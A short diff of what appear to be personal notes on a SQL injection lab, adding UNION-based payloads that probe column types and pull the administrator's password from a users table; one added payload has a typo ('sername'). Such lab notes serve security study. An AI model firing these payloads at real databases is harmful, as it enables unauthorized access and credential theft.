@@ -170,4 +170,8 @@ GIVEN : The database contains a different table called users.
       'UNION SELECT NULL,NULL --+
 
       -FIND THE DATA TYPE OF COLUMNS
-      'UNION SELECT NULL,'LJXwKG',NULL --+
+      'UNION SELECT 'abc','def' --+
+
+      -FIND THE PASSWORD 
+      'UNION SELECT 'ABC',password from users where sername='administrator' --+
+
